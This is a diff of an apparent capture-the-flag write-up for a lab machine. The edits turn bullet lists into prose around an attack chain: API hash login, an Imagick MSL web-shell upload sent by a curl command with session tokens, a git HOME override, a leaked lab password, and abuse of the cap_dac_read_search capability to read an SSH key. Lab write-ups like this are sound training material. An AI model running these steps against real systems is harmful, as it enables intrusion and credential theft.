@@ -29,15 +29,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 28.20 seconds
 ```
 
-Port 80 -> register as user and login:
-- Nothing interesting at first
-- Directories `/storage` and `/admin` -> **403** error
-- Also spotted `/.git` under storage
+Port 80 -> register as user and login. Nothing interesting at first: directories `/storage` and `/admin` returned a **403** error, though we also spotted `/.git` under storage.
 
-There's an **input field** called **Favorite Genres** in the **Your Profile** tab:
-- whatever Genre you enter reflects on the feed tab
-- genres works with POST api request
-- feed works with GET api request
+There's an **input field** called **Favorite Genres** in the **Your Profile** tab: whatever genre you enter reflects on the feed tab. The genre write goes through a POST api request, and the feed reads it back with a GET api request.
 
 Smells like a second-order sql injection:
 
@@ -140,24 +134,21 @@ curl -X POST http://intentions.htb/api/v2/auth/login
 So we can login using the hash on **v2** of the api.
 
 Login either with **burpsuite** or **curl**:
+
 - change the parameter to `hash` and change the POST request api from v1 to v2
 
 Successfully logged in as **steve**!
 
-- Still `/storage` has **403** error
-- but we can check the `/admin` page
+`/storage` still has a **403** error, but we can check the `/admin` page.
 
-In the admin page a notice says that to mitigate copyright claims they use a php class called **imagick**
+In the admin page a notice says that to mitigate copyright claims they use a php class called **imagick**. It uses an endpoint called **modify**, and it also reveals the path of the image.
 
-- It uses an endpoint called **modify**
-- It also reveals the path of the image
-
-- Google search reveals the **imagick** class can potentially lead us to RCE:
+A google search reveals the **imagick** class can potentially lead us to RCE:
 
 > Reference - https://kris3c.github.io/article/surprising-imagick-with-rce.html
 
 #### Verifying 
-The **content length** keeps **changing** when **adding** `[10x10]` — confirms we have **access** to the **imagick library**
+Adding `[10x10]` keeps the **content length** **changing** — confirms we have **access** to the **imagick library**
 
 > **Note**: **MSL** stands for **Magick Scripting Language**, a scripting language used by ImageMagick (image processing software). MSL files are text-based and contain XML-like markup defining image operations — they are not image files themselves, they're scripts that _instruct_ ImageMagick on how to process or create images.
 
@@ -171,8 +162,7 @@ By following the instructions we created a **payload.msl** file:
 </image>
 ```
 
-We use the **caption:** and **info:** schemes to try and obtain a **web shell**:
-- read holds the payload and write holds the location of the writable source
+We use the **caption:** and **info:** schemes to try and obtain a **web shell** — `read` holds the payload and `write` holds the location of the writable source.
 
 We use **curl** for upload — `Go to Inspect -> Network -> Modify request -> Copy Value -> Copy as cURL`.
 
@@ -196,8 +186,7 @@ curl 'http://intentions.htb/api/v2/admin/image/modify' \
   --data-raw '{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"charcoal"}'
 ```
 
-Modified payload according to the reference:
-- remove all the headers except **X-XSRF-TOKEN** and **cookie**
+Modified payload according to the reference — remove all the headers except **X-XSRF-TOKEN** and **cookie**:
 
 ```sh
 curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IlZxRjI0RVV2a0tVSEtuTmsxTWRWTUE9PSIsInZhbHVlIjoiaURKWkVJVVQ0QkxsMCtLSlp6OEJTMzM3Y21BR1FwNlpTOWR2WFovdzI0dUpRUWhvSmVKSnA3QWcxd0tXTUtvazl4d2doREhqbE5aV0NrdDQ2aFU0eUJDVVpHQkRYY2tJNTdIRjQvMFhNZDVJVVFTclBkcU9nNFF3SUxZUzVESk8iLCJtYWMiOiJmMWIwZjNhMDMwM2VjNjNkYzVjNDE4YzEzYjdhNjFhMzVkODlkNTkyNTRiN2I5MWUxNGI1YzlkOTY2NTY0MGU4IiwidGFnIjoiIn0=' -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3OTAxNzIwNTMsImV4cCI6MTc5MDE5MzY1MywibmJmIjoxNzkwMTcyMDUzLCJqdGkiOiJHd01wQ1dMOVlPbTBqd2ZGIiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.y_FyhcyxR8kXm50sJaKTXKltPnU4Wpdy7BRNKWDDvEU; XSRF-TOKEN=eyJpdiI6IlZxRjI0RVV2a0tVSEtuTmsxTWRWTUE9PSIsInZhbHVlIjoiaURKWkVJVVQ0QkxsMCtLSlp6OEJTMzM3Y21BR1FwNlpTOWR2WFovdzI0dUpRUWhvSmVKSnA3QWcxd0tXTUtvazl4d2doREhqbE5aV0NrdDQ2aFU0eUJDVVpHQkRYY2tJNTdIRjQvMFhNZDVJVVFTclBkcU9nNFF3SUxZUzVESk8iLCJtYWMiOiJmMWIwZjNhMDMwM2VjNjNkYzVjNDE4YzEzYjdhNjFhMzVkODlkNTkyNTRiN2I5MWUxNGI1YzlkOTY2NTY0MGU4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkFuaHpBNG5kVUc3ZzMrQzdUZlkyNHc9PSIsInZhbHVlIjoiS0x0bmtrc1VlMEh6dy9ZWk92T1RRZnNieUZrUFBVSDV0QVcrejhwL3lwYVFpbG1Dd2hxcEhKcFJnN1dCYlJ5OXNSaUVvNjNYRi9qV1Fwc3VWNkpvREdLbkRQbDdzNC8wOHB3aFl2R1hrUWRQeEMrQW9RRkhuSnFqMDM3Y3JrN3ciLCJtYWMiOiJhN2YwYWNmZGM3MGYxOGM0ZWEyZDlhMWMwOGE4NDdhZDBkYTgyZmEyNzgzY2IxMGVkNTc1M2FhNTRiYWJkZjRmIiwidGFnIjoiIn0%3D' -F 'path=vid:msl:/tmp/php*' -F 'effect=charcoal' -F file=@payload.msl
@@ -240,9 +229,9 @@ git config --global --add safe.directory /var/www/html/intentions
 error: could not lock config file /var/www/.gitconfig: Permission denied
 ```
 
-We will find that our lack of write access in /var/www causes us some issues.
+Our lack of write access in /var/www causes us some issues.
 
-Going through the **git documentation** reveals that **overwriting** the **$HOME** environmental variable we can get our way:
+Going through the **git documentation** reveals that **overwriting** the **$HOME** environmental variable lets us get our way:
 
 ```sh
 HOME=/tmp git config --global --add safe.directory /var/www/html/intentions
@@ -254,7 +243,7 @@ Now we can read through the logs and spot a **password** for the user greg:
 
 > `greg - Gr3g1sTh3B3stDev3l0per!1998!`
 
-Login as greg, we gained the user flag.
+Login as greg and we gained the user flag.
 
 # Root 
 
@@ -279,7 +268,7 @@ It explains the functionality of the scanner.
 **Summary** :
 copyright_scanner is a utility that checks files or directories against an MD5 hash blacklist to identify copyrighted material or duplicate images previously submitted to a platform. It compares file hashes against a `LABEL:MD5` formatted list and outputs matches in the format `[+] {LABEL} matches {FILE}`, or nothing if no matches are found.
 
-- We got to know `-l` is used to set byte limit - default 500
+We got to know `-l` is used to set byte limit - default 500
 
 The only way left for the binary to have read access to a file we don't have is through **capabilities**:
 
@@ -289,7 +278,7 @@ getcap /opt/scanner/scanner
 /opt/scanner/scanner cap_dac_read_search=ep
 ```
 
-- it has the `cap_dac_read_search` capability — the **scanner** binary can **read** any file on the system regardless of whether our user has **access to the file** or the overall file path.
+It has the `cap_dac_read_search` capability — the **scanner** binary can **read** any file on the system regardless of whether our user has **access to the file** or the overall file path.
 
 We can abuse this by brute-forcing the **id-rsa** key with a python script:
 
